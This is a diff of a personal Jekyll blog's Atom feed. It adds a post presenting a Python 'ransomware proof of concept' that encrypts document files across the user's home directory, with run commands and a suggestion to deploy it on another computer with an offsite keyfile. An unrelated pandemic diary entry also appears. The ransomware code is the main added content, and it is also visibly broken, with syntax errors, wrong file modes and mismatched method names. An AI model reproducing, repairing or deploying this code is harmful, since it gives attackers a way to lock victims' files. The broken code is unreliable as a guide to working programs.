@@ -1,4 +1,130 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-12T18:46:18+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Adrian Ducao</title><subtitle>An Open Source Blog</subtitle><entry><title type="html">The year i love and hate</title><link href="http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate.html" rel="alternate" type="text/html" title="The year i love and hate" /><published>2020-08-12T12:15:00+08:00</published><updated>2020-08-12T12:15:00+08:00</updated><id>http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate</id><content type="html" xml:base="http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate.html">&lt;h3 id=&quot;pandemic-shtf&quot;&gt;Pandemic SHTF&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-29T09:22:02+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Adrian Ducao</title><subtitle>An Open Source Blog</subtitle><entry><title type="html">Ransomware Proof of concept</title><link href="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html" rel="alternate" type="text/html" title="Ransomware Proof of concept" /><published>2020-08-29T06:00:00+08:00</published><updated>2020-08-29T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware</id><content type="html" xml:base="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html">&lt;h3 id=&quot;ransomware-concept&quot;&gt;Ransomware Concept&lt;/h3&gt;
+&lt;p&gt;The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python. You can check my code repo here &lt;a href=&quot;https://github.com/AdrianDucao/run-some-crypt&quot;&gt;run-some-crypt&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;content&quot;&gt;Content&lt;/h4&gt;
+&lt;ol&gt;
+  &lt;li&gt;generate a key to be used for encryption and decryption&lt;/li&gt;
+  &lt;li&gt;write a key file&lt;/li&gt;
+  &lt;li&gt;read a key file&lt;/li&gt;
+  &lt;li&gt;scanning directory&lt;/li&gt;
+  &lt;li&gt;encypt the target files&lt;/li&gt;
+  &lt;li&gt;create cli interface&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;generate-a-key-to-be-used-for-encryption-and-decryption&quot;&gt;generate a key to be used for encryption and decryption&lt;/h3&gt;
+&lt;p&gt;Let’s begin by importing the OS module since we can use its functions for interactions with the OS, for encryption we can import the &lt;a href=&quot;https://cryptography.io/en/latest/fernet/&quot;&gt;Fernet(Semantic Encrytion)&lt;/a&gt; Module.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  1 import os
+  2 from os.path import expanduser
+  3 from cryptography.fernet import Fernet
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;create a class and constructor, below that is the generateKey function&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  5 class Encrypt:
+  6 
+  7     def __init__(self):
+  8 
+  9         self.key = None
+ 10         self.cryptor = None
+ 11         self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']
+ 12 
+ 13     def generateKey(self):
+ 14 
+ 15         self.key = Fernet.generate_key()
+ 16         self.cryptor = Fernet(self.key)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;write-a-key-file&quot;&gt;write a key file&lt;/h3&gt;
+&lt;p&gt;now lets create a function to write the key to a file&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 23     def writeKey(self, key_filename):
+ 24         with open.(key_filename, 'b') as f:
+ 25             f.write(self.key)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;read-a-key-file&quot;&gt;read a key file&lt;/h3&gt;
+&lt;p&gt;moving on, create a function to read a key from a file&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 18     def readKey(self, key_filename):
+ 19         with open(key_filename, 'a') as f:
+ 20             self.key = f.read()
+ 21             self.cryptor = Fernet(self.key)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;scanning-directory&quot;&gt;scanning directory&lt;/h3&gt;
+&lt;p&gt;the function below allows you to scan the directories and check for target filename extensions specified earlier on self.file_ext_targets&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 28     def mainCrypt(self, root_dir, encrypted = False):
+ 29         for root, _, files in os.walk(root_dir):
+ 30             for f in files:
+ 31                 abs_file_path = os.path.join(root, f)
+ 32 
+ 33                 if not abs_file_path('.')[-1] in self.file_ext_targets:
+ 34                     continue
+ 35 
+ 36                 self.crypt_file(abs_file_path, encrypted = encrypted)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;encrypt-the-target-files&quot;&gt;encrypt the target files&lt;/h3&gt;
+&lt;p&gt;function to encrypt the specified filename extensions and check if that file has been encrypted or not&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 38     def encryptFile(self, file_path, encrypted = False):
+ 39         with open(file_path, 'a+') as f:
+ 40             _data = f.read()
+ 41 
+ 42             if not encrypted:
+ 43                 data = self.cryptor.encrypt(_data)
+ 44             else
+ 45                 data = self.cryptor.decrypt(_data)
+ 46 
+ 47             f.seek(0)
+ 48             f.write(data)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;create-a-cli-interface&quot;&gt;create a cli interface&lt;/h3&gt;
+&lt;p&gt;how it works is that you call the class we created earlier and create a conditional statement where you can specify and action you want to take e.g. encrypt or decrypt files.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 51 if __name__ == '__main__':
+ 52     #all directory
+ 53     sys_root = expanduser('~')
+ 54 
+ 55     #specific target directory
+ 56     #local_root= '.'
+ 57 
+ 58     import argparse
+ 59     parser = argparse.ArgumentParser()
+ 60     parser.add_argument('--action', required=True)
+ 61     parser.add_argument('--keyfile')
+ 62 
+ 63 
+ 64     args = parser.parse_args()
+ 65     action = args.action.lower()
+ 66     keyfile = args.keyfile
+ 67 
+ 68     lock = Encrypt()
+ 69 
+ 70     if action == 'decrypt':
+ 71         if keyfile is None:
+ 72             print('Specify path to keyfile after --keyfile')
+ 73         else:
+ 74             lock.read_key(keyfile)
+ 75             lock.mainCrypt(local_root, encrypted=True)
+ 76     elif action == 'encrypt':
+ 77         lock.generate_key()
+ 78         lock.write_key('keyfile')
+ 79         lock.mainCrypt(sys_root)
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+&lt;p&gt;After that typing, you’re set and done. If you are planning to use this to another computer, you can create an executable file to run this code set an offsite server to host and store the keyfile for later use. Another use case for this is to make a secure encrypted files inside your flash drive or hard drive, as long as you have the keyfile or know the key you’re the only one who can open those files. It’s not a matter of if but when the quantum computers will comes to age, privacy and secuity through encryption might disappear.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 crypt.py --action encrypt
+
+$ python3 crypt.py --action decrypt --keyfile /path/keyfile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Happy Hunting.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">Ransomware Concept The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python. You can check my code repo here run-some-crypt.</summary></entry><entry><title type="html">The year i love and hate</title><link href="http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate.html" rel="alternate" type="text/html" title="The year i love and hate" /><published>2020-08-12T12:15:00+08:00</published><updated>2020-08-12T12:15:00+08:00</updated><id>http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate</id><content type="html" xml:base="http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate.html">&lt;h3 id=&quot;pandemic-shtf&quot;&gt;Pandemic SHTF&lt;/h3&gt;
 
 &lt;p&gt;The year the Pandemic SHTF, limited access, limited movement, and limited productive things to do. It all started just with subtle cases, deaths, and recoveries on the month January and it went nuts by the month of March, But this situation at hand there’s a noticable growth on creativity and financial awareness of masses, maybe they realized that they haven’t prepare for this sort of thing or have the capacity to deal with the unemployment and restriction nonetheless i did notice the urge of people to get rid with the boredom of being confined in their own houses, social media and other ways of entertainment are one of many choices we have to get rid of this feeling of boredom. I however want to explore things that i’ve missed for couple of years, since i started working i haven’t had enough time to learn and ponder on the things i like the most which are programming, web development, and business.&lt;/p&gt;
 
@@ -34,7 +160,10 @@
 &lt;h3 id=&quot;april-23-2020&quot;&gt;April 23, 2020&lt;/h3&gt;
 &lt;h3 id=&quot;april-29-2020&quot;&gt;April 29, 2020&lt;/h3&gt;
 &lt;h3 id=&quot;may-4-2020&quot;&gt;May 4, 2020&lt;/h3&gt;
-&lt;h3 id=&quot;may-10-2020&quot;&gt;May 10, 2020&lt;/h3&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Pandemic SHTF</summary></entry><entry><title type="html">Welcome to adrianducao.github.io</title><link href="http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io.html" rel="alternate" type="text/html" title="Welcome to adrianducao.github.io" /><published>2020-04-06T12:47:36+08:00</published><updated>2020-04-06T12:47:36+08:00</updated><id>http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io.html">&lt;p&gt;This static website will mainly show my daily or weekly blog post about Programming, Web App Development, Security and other stuff while learning things.&lt;/p&gt;
+&lt;h3 id=&quot;may-10-2020&quot;&gt;May 10, 2020&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;May 10, 2020&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Pandemic SHTF</summary></entry><entry><title type="html">Welcome to adrianducao.github.io</title><link href="http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io.html" rel="alternate" type="text/html" title="Welcome to adrianducao.github.io" /><published>2020-04-06T12:47:36+08:00</published><updated>2020-04-06T12:47:36+08:00</updated><id>http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io.html">&lt;p&gt;This static website will mainly show my daily or weekly blog post about Programming, Web App Development, Security and other stuff while learning things.&lt;/p&gt;
 
 &lt;!-- 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
